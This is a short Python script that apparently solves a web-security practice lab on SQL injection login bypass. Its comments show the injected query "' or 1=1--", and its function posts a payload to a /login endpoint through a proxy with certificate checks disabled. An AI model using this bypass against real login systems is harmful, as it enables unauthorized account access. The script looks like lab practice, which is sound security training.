import requests
from proxies import proxies

# SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' 
# SELECT * FROM users WHERE username = '' or 1=1-- AND password = ''

def solve(url: str, payload: str):
    uri = '/login'
    r = requests.session()
    r.post(url + uri + payload)
    r = requests.post(url + uri + payload, verify=False, proxies=proxies)
    if "Your username is" in r.text:
        return True
    else:
        return False